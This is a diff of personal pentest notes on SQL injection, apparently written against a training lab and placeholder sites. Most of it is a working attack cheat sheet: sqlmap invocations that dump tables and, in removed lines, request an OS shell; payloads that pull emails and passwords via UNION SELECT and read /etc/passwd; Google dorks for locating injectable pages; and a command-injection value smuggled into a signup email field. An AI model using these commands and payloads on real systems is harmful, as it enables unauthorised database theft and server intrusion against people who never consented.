@@ -1,25 +1,7 @@
 SQL Injection
 
 
-2-25-15 I just dumped these notes in here. Need to clean them up and organize.
-
-
-Use Burp to trap a request. Copy the request to /root/request.txt.
-
-sqlmap -r /root/request.txt
-sqlmap -r /root/request.txt -p <parameter to test> --current-user
-sqlmap -r /root/request.txt -D <database> --tables              Show all tables in database
-sqlmap -r /root/request.txt -D <database> -T <table> --dump     Show all data in table
-
-sqlmap -u "http://dojo-basic/index.php?page=user-info.php" --data=cookie="sessionid=d935d2d4dfb558c3d798840b5ad3e7f0; uid=NQ%3D%3D" -p user_name --dbms MySQL
-sqlmap -u "http://dojo-basic/index.php?page=user-info.php" --data="user_name=root&password=toor&Submit_button=Submit" --cookie="sessionid=d935d2d4dfb558c3d798840b5ad3e7f0; uid=NQ%3D%3D" -p "user_name" --dbms MySQL --current-user --current-db
-sqlmap -u "http://dojo-basic/index.php?page=user-info.php" --data="user_name=root&password=toor&Submit_button=Submit" --cookie="sessionid=d935d2d4dfb558c3d798840b5ad3e7f0; uid=NQ%3D%3D" -p "user_name" --dbms MySQL —dbs
-sqlmap -u "http://dojo-basic/index.php?page=user-info.php" --data="user_name=root&password=toor&Submit_button=Submit" --cookie="sessionid=d935d2d4dfb558c3d798840b5ad3e7f0; uid=NQ%3D%3D" -p "user_name" --dbms MySQL -D samurai_dojo_basic —tables
-sqlmap -u "http://dojo-basic/index.php?page=user-info.php" --data="user_name=root&password=toor&Submit_button=Submit" --cookie="sessionid=d935d2d4dfb558c3d798840b5ad3e7f0; uid=NQ%3D%3D" -p "user_name" --dbms MySQL -D samurai_dojo_basic -T accounts —columns
-sqlmap -u "http://dojo-basic/index.php?page=user-info.php" --data="user_name=root&password=toor&Submit_button=Submit" --cookie="sessionid=d935d2d4dfb558c3d798840b5ad3e7f0; uid=NQ%3D%3D" -p "user_name" --dbms MySQL -D samurai_dojo_basic -T accounts —dump
-------------------------------------------------------------------------------------------------------
-
-Check for SQLi by adding and single quote or the following syntax:  ‘ or ‘1’= ‘1
+Check for SQLi by adding and single quote or the following: ‘ or 1=1--<space>
 
 http://www.target.com/index.php?val=100’ 
 http://www.target.com/index.php?val=100’ or ‘1’=’1 
@@ -43,30 +25,10 @@ inurl:article.php?id=
 inurl:pageid=
 ------------------------------------------------------------------------------------------------------
 
-SQL databases interpret the quote character as the boundary between code and data. It assumes that 
-anything following a quote is code that it needs to run and anything encapsulated by a quote is data.
+SQL databases interpret the single quote character as the boundary between code and data. It assumes that 
+anything following a single quote is code that it needs to run and anything encapsulated by a quote is data.
 
-Example:  SELECT * FROM products WHERE price < '100' ORDER BY description;
-
-Find the database version:  ' and 1 in (SELECT @@version) —    
-
-MySQL: 1 UNION ALL SELECT LOAD_FILE('/etc/passwd')--
-
-Oracle: enumerate all accessible tables for the current user.
-
-SELECT OWNER, TABLE_NAME FROM ALL_TABLES ORDER BY TABLE_NAME;
-
-MySQL: enumerate all accessible tables and databases for the current user.
-
-SELECT table_schema, table_name FROM information_schema.tables;
-
-MS-SQL: enumerate all accessible tables using the system tables.
-
-SELECT name FROM sysobjects WHERE xtype = 'U';
-
-MS-SQL: enumerate all accessible tables using the catalog views.
-
-SELECT name FROM sys.tables;
+Example: SELECT * FROM products WHERE price < '100' ORDER BY description;
 
 ' and 1=0/@@version;--
 ' and 1=0/user;--
@@ -75,7 +37,7 @@ SELECT name FROM sys.tables;
 ' GROUPED BY productid,name having '1'='1
 ------------------------------------------------------------------------------------------------------
 
-MS-SQL server concatenates numbers, it does not add them. '10' + '0' would equal 100 NOT 10.
+MS-SQL server concatenates numbers, it does not add them. '10' + '0' would equal 100 not 10.
  
 SELECT * FROM table1 WHERE condition1
 union all
@@ -83,19 +45,24 @@ union all
 SELECT * FROM table2 WHERE condition2
 
 OS - @@version
-  Server Instances - @@servername
+  Server instances - @@servername
     Databases
       Tables
         Columns
 
 SELECT name FROM master..sysdatabases
-/article.aspx?article_id=0+UNION+SELECT+EMAIL,+USERID,+PASSWORD+FROM+USERS
 ------------------------------------------------------------------------------------------------------
 
-' or '1'='1
 http://target.com/bookservice/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0))—
-
-sqlmap -u "http://target.com/bookservice/bookdetail.aspx?id=2" —dump
-sqlmap -u "http://target.com/bookservice/bookdetail.aspx?id=2" —os-shell
-
+http://target.com/article.aspx?article_id=0+UNION+SELECT+EMAIL,+USERID,+PASSWORD+FROM+USERS
 Newsletter signup > Subscribe:  joe@gmail.com & ipconfig > C:\inetpub\wwwroot\Book\test.txt
+------------------------------------------------------------------------------------------------------
+
+Use Burp to trap a request. Copy the request to /root/tmp.
+
+sqlmap -r /root/tmp
+sqlmap -r /root/tmp -p <parameter> --current-user      Show the current user that the database is running as
+sqlmap -r /root/tmp --dbs                              Search for all databases
+sqlmap -r /root/tmp -D <database> --tables             Show all tables in database
+sqlmap -r /root/tmp -D <database> -T <table> --dump    Show all data in table
+
